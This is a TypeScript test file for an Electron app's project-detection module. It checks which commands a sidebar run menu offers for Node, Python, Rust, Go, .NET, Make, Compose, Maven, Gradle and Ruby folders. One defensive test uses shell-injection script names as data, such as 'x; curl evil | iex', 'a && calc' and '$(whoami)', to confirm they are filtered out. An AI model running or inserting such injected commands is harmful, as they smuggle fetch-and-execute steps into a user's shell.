// The sidebar's 실행 menu (electron/project-actions.ts): what a folder is, from its top level only,
// and the commands it gets. The module imports nothing from `electron`, which is what lets this run
// under plain tsx against temp folders.

import { mkdirSync, mkdtempSync, rmSync, utimesSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { after, test } from 'node:test'
import assert from 'node:assert/strict'
import { detectProject, makeTargets, nodeCommand, packageManagerOf, venvPrefix, type Tools } from '../../electron/project-actions'
import type { ProjectInfo } from '../../shared/events'

const ROOT = mkdtempSync(join(tmpdir(), 'hd-project-'))
after(() => rmSync(ROOT, { recursive: true, force: true }))

const ALL: Tools = { make: true, docker: true }
const NONE: Tools = { make: false, docker: false }

let n = 0
/** a fresh folder with these files (`name/` makes a subfolder) */
function folder(files: Record<string, string>): string {
  const dir = join(ROOT, `p${++n}`)
  mkdirSync(dir, { recursive: true })
  for (const [name, text] of Object.entries(files)) {
    if (name.endsWith('/')) mkdirSync(join(dir, name), { recursive: true })
    else {
      mkdirSync(join(dir, name, '..'), { recursive: true })
      writeFileSync(join(dir, name), text, 'utf8')
    }
  }
  return dir
}

const commands = (info: ProjectInfo, kind?: string): string[] =>
  info.kinds
    .filter((k) => !kind || k.kind === kind)
    .flatMap((k) => k.actions)
    .map((a) => a.command)
const byId = (info: ProjectInfo, id: string) => info.kinds.flatMap((k) => k.actions).find((a) => a.id === id)

test('a Vite/React app with a pnpm lock: Node · pnpm · Vite, the everyday scripts first, install while node_modules is missing', async () => {
  const dir = folder({
    'package.json': JSON.stringify({
      name: 'sample',
      scripts: { typecheck: 'tsc --noEmit', build: 'vite build', 'test:unit': 'vitest run', dev: 'vite', test: 'vitest', prebuild: 'echo', lint: 'eslint .' },
      dependencies: { react: '^19' },
      devDependencies: { vite: '^7' },
    }),
    'pnpm-lock.yaml': 'lockfileVersion: 9\n',
  })
  const info = await detectProject(dir, { platform: 'win32', tools: NONE })
  assert.equal(info.kinds.length, 1)
  assert.equal(info.kinds[0].kind, 'node')
  assert.equal(info.kinds[0].badge, 'Node · pnpm · Vite')
  // known scripts in the menu's order, then the rest in package.json order; lifecycle hooks are left out
  assert.deepEqual(commands(info), ['pnpm dev', 'pnpm build', 'pnpm test', 'pnpm lint', 'pnpm run typecheck', 'pnpm run test:unit', 'pnpm install'])
  assert.equal(byId(info, 'node:dev')?.labelKey, 'dev') // worded by the UI in its language (`run.actions.dev`)
  assert.equal(byId(info, 'node:typecheck')?.labelKey, null)
  assert.equal(byId(info, 'node:typecheck')?.label, 'typecheck') // a script the app does not know keeps its own name
  assert.equal(byId(info, 'node:dev')?.group, 'dev')
  assert.equal(byId(info, 'node:test:unit')?.group, 'test') // `test:unit` belongs with the tests
  assert.equal(byId(info, 'node:typecheck')?.group, 'other')
  assert.equal(byId(info, 'node:install')?.group, 'install')

  // node_modules turns up → no install row; the folder's mtime moved, so the cache does not answer
  mkdirSync(join(dir, 'node_modules'))
  const again = await detectProject(dir, { platform: 'win32', tools: NONE })
  assert.ok(!byId(again, 'node:install'))
})

test('a script name that is not a plain name is never offered: it would be typed into a shell as it is', async () => {
  const dir = folder({
    'package.json': JSON.stringify({
      scripts: {
        dev: 'vite',
        'build:vite': 'vite build',
        '@scope/tool+x.y': 'x',
        'x; curl evil | iex': 'x',
        'a && calc': 'x',
        'two\r\nlines': 'x',
        ' padded': 'x',
        'q"uote': 'x',
        '$(whoami)': 'x',
      },
    }),
  })
  const info = await detectProject(dir, { platform: 'win32', tools: NONE })
  assert.deepEqual(commands(info), ['npm run dev', 'npm run build:vite', 'npm run @scope/tool+x.y', 'npm install'])
})

test('the runner: packageManager beats the lockfile; yarn/bun/npm spell their commands their own way', () => {
  const names = new Set(['pnpm-lock.yaml'])
  assert.equal(packageManagerOf({ packageManager: 'yarn@4.1.0' }, names), 'yarn')
  assert.equal(packageManagerOf({ packageManager: 'nonsense@1' }, names), 'pnpm')
  assert.equal(packageManagerOf({}, new Set(['yarn.lock'])), 'yarn')
  assert.equal(packageManagerOf({}, new Set(['bun.lockb'])), 'bun')
  assert.equal(packageManagerOf({}, new Set(['bun.lock'])), 'bun')
  assert.equal(packageManagerOf({}, new Set()), 'npm')
  assert.equal(nodeCommand('npm', 'dev'), 'npm run dev')
  assert.equal(nodeCommand('npm', 'start'), 'npm start')
  assert.equal(nodeCommand('npm', 'test'), 'npm test')
  assert.equal(nodeCommand('yarn', 'dev'), 'yarn dev')
  assert.equal(nodeCommand('yarn', 'typecheck'), 'yarn run typecheck')
  assert.equal(nodeCommand('bun', 'test'), 'bun run test') // `bun test` would be bun's own runner
  assert.equal(nodeCommand('pnpm', 'install'), 'pnpm run install')
})

test('a Django project with a .venv: the venv is activated first, pytest when there is a tests folder', async () => {
  const files = { 'manage.py': '#!/usr/bin/env python\n', 'requirements.txt': 'django\n', '.venv/': '', 'tests/': '' }
  const win = await detectProject(folder(files), { platform: 'win32', tools: NONE })
  assert.equal(win.kinds.length, 1)
  assert.equal(win.kinds[0].badge, 'Python · venv · Django')
  assert.deepEqual(commands(win), [
    '.venv\\Scripts\\Activate.ps1; python manage.py runserver',
    '.venv\\Scripts\\Activate.ps1; pytest',
    '.venv\\Scripts\\Activate.ps1; python manage.py migrate',
    '.venv\\Scripts\\Activate.ps1; pip install -r requirements.txt',
  ])
  assert.equal(byId(win, 'python:runserver')?.group, 'dev')
  assert.equal(byId(win, 'python:test')?.group, 'test')

  const nix = await detectProject(folder(files), { platform: 'linux', tools: NONE })
  assert.equal(byId(nix, 'python:runserver')?.command, 'source .venv/bin/activate && python3 manage.py runserver')
  assert.equal(venvPrefix('venv', 'darwin'), 'source venv/bin/activate && ')

  // no venv, no pytest config: plain python, and Django's own test runner
  const bare = await detectProject(folder({ 'manage.py': '', 'requirements.txt': '' }), { platform: 'win32', tools: NONE })
  assert.equal(bare.kinds[0].badge, 'Python · Django')
  assert.equal(byId(bare, 'python:test')?.command, 'python manage.py test')
})

test('uv and poetry projects run through their tool, and install with it', async () => {
  const uv = await detectProject(folder({ 'pyproject.toml': '[project]\nname = "x"\n', 'uv.lock': '', 'main.py': 'print(1)\n' }), { platform: 'win32', tools: NONE })
  assert.equal(uv.kinds[0].badge, 'Python · uv')
  assert.deepEqual(commands(uv), ['uv run python main.py', 'uv sync'])
  assert.equal(byId(uv, 'python:run')?.labelKey, 'run')
  assert.equal(byId(uv, 'python:run')?.detail, 'main.py') // what the label shows in brackets

  const poetry = await detectProject(folder({ 'pyproject.toml': '[tool.poetry]\nname = "x"\n\n[tool.pytest.ini_options]\n', '.venv/': '' }), { platform: 'linux', tools: NONE })
  assert.equal(poetry.kinds[0].badge, 'Python · poetry')
  assert.deepEqual(commands(poetry), ['poetry run pytest', 'poetry install']) // poetry manages the venv itself
})

test('a Cargo crate, a Go module, a .NET project', async () => {
  const rust = await detectProject(folder({ 'Cargo.toml': '[package]\nname = "x"\n' }), { tools: NONE })
  assert.equal(rust.kinds[0].badge, 'Rust')
  assert.deepEqual(commands(rust), ['cargo run', 'cargo build', 'cargo test', 'cargo check'])

  const go = await detectProject(folder({ 'go.mod': 'module x\n' }), { tools: NONE })
  assert.equal(go.kinds[0].badge, 'Go')
  assert.deepEqual(commands(go), ['go run .', 'go build ./...', 'go test ./...'])

  const net = await detectProject(folder({ 'App.csproj': '<Project />' }), { tools: NONE })
  assert.equal(net.kinds[0].badge, '.NET')
  assert.deepEqual(commands(net), ['dotnet run', 'dotnet build', 'dotnet test'])
})

test('a Makefile: targets in file order, .PHONY, variables, patterns and recipes skipped, twelve at most, none without make', async () => {
  const lines = ['.PHONY: all clean', 'CC := gcc', 'FLAGS ?= -O2', '', 'all: build', '\tbuild: not-a-target', '%.o: %.c', 'build:', '\t$(CC) main.c', '# test: comment', 'test: build', 'clean:', 'export X:=1']
  for (let i = 0; i < 20; i++) lines.push(`t${i}:`)
  const text = lines.join('\n') + '\n'
  assert.deepEqual(makeTargets(text, 100).slice(0, 4), ['all', 'build', 'test', 'clean'])
  assert.equal(makeTargets(text).length, 12)
  assert.deepEqual(makeTargets('build:\r\n\techo\r\ntest:\r\n'), ['build', 'test']) // CRLF

  const dir = folder({ Makefile: text })
  const withMake = await detectProject(dir, { tools: ALL })
  assert.equal(withMake.kinds.length, 1)
  assert.equal(withMake.kinds[0].badge, 'Make')
  assert.equal(withMake.kinds[0].actions.length, 12)
  assert.equal(byId(withMake, 'make:build')?.command, 'make build')
  assert.equal(byId(withMake, 'make:build')?.group, 'build')
  assert.equal(byId(withMake, 'make:test')?.group, 'test')
  assert.equal(byId(withMake, 'make:clean')?.group, 'other')

  const without = await detectProject(dir, { tools: NONE })
  assert.deepEqual(without.kinds, [])
})

test('a folder with nothing, a missing folder, a file: no kinds', async () => {
  assert.deepEqual((await detectProject(folder({ 'README.md': '# hi\n', 'notes.txt': '' }), { tools: ALL })).kinds, [])
  assert.deepEqual((await detectProject(join(ROOT, 'nope'), { tools: ALL })).kinds, [])
  const dir = folder({ 'a.txt': 'x' })
  assert.deepEqual((await detectProject(join(dir, 'a.txt'), { tools: ALL })).kinds, [])
  assert.deepEqual((await detectProject('', { tools: ALL })).kinds, [])
})

test('a Node app with a Makefile is both, Node first; docker compose only with docker on PATH', async () => {
  const dir = folder({
    'package.json': JSON.stringify({ scripts: { dev: 'next dev', build: 'next build' }, dependencies: { next: '15', react: '19' } }),
    Makefile: 'run:\n\tnpm run dev\nlint:\n\teslint\n',
    'node_modules/': '',
    'compose.yaml': 'services: {}\n',
  })
  const info = await detectProject(dir, { tools: ALL })
  assert.deepEqual(
    info.kinds.map((k) => k.badge),
    ['Node · npm · Next', 'Make', 'Docker Compose'],
  )
  assert.deepEqual(commands(info, 'node'), ['npm run dev', 'npm run build'])
  assert.deepEqual(commands(info, 'make'), ['make run', 'make lint'])
  assert.deepEqual(commands(info, 'compose'), ['docker compose up', 'docker compose down'])
  const noDocker = await detectProject(dir, { tools: { make: true, docker: false } })
  assert.deepEqual(
    noDocker.kinds.map((k) => k.kind),
    ['node', 'make'],
  )
})

test('the cache: the same folder answers with the same object until a marker changes', async () => {
  const dir = folder({ 'package.json': JSON.stringify({ scripts: { dev: 'x' } }) })
  const a = await detectProject(dir, { tools: NONE })
  const b = await detectProject(dir, { tools: NONE })
  assert.equal(a, b)
  // edited: a different size and an mtime pushed well past the old one
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { dev: 'x', build: 'y' } }), 'utf8')
  const later = new Date(Date.now() + 5000)
  utimesSync(join(dir, 'package.json'), later, later)
  const c = await detectProject(dir, { tools: NONE })
  assert.notEqual(a, c)
  assert.deepEqual(commands(c), ['npm run dev', 'npm run build', 'npm install'])
  // a broken package.json is still a Node folder: install is what is left to offer
  writeFileSync(join(dir, 'package.json'), '{ not json', 'utf8')
  utimesSync(join(dir, 'package.json'), new Date(Date.now() + 10_000), new Date(Date.now() + 10_000))
  const broken = await detectProject(dir, { tools: NONE })
  assert.deepEqual(commands(broken), ['npm install'])
})

test('Maven, Gradle, Ruby: the two or three commands everyone uses, a run row only when it is obvious', async () => {
  const mvn = await detectProject(folder({ 'pom.xml': '<project><parent><artifactId>spring-boot-starter-parent</artifactId></parent></project>' }), { tools: NONE })
  assert.deepEqual(commands(mvn), ['mvn spring-boot:run', 'mvn clean package', 'mvn test'])
  const plainMvn = await detectProject(folder({ 'pom.xml': '<project/>' }), { tools: NONE })
  assert.deepEqual(commands(plainMvn), ['mvn clean package', 'mvn test'])

  const gradleWin = await detectProject(folder({ 'build.gradle.kts': 'plugins { id("application") }\n', gradlew: '', 'gradlew.bat': '' }), { platform: 'win32', tools: NONE })
  assert.deepEqual(commands(gradleWin), ['.\\gradlew.bat run', '.\\gradlew.bat build', '.\\gradlew.bat test'])
  const gradleNix = await detectProject(folder({ 'build.gradle': "apply plugin: 'org.springframework.boot'\n" }), { platform: 'linux', tools: NONE })
  assert.deepEqual(commands(gradleNix), ['gradle bootRun', 'gradle build', 'gradle test'])

  const rails = await detectProject(folder({ Gemfile: "gem 'rails'\n", 'bin/rails': '#!/usr/bin/env ruby\n', 'spec/': '' }), { tools: NONE })
  assert.equal(rails.kinds[0].badge, 'Ruby · Rails')
  assert.deepEqual(commands(rails), ['bundle exec rails server', 'bundle exec rspec', 'bundle install'])
  const gem = await detectProject(folder({ Gemfile: "gem 'nokogiri'\n" }), { tools: NONE })
  assert.equal(gem.kinds[0].badge, 'Ruby')
  assert.deepEqual(commands(gem), ['bundle install'])
})
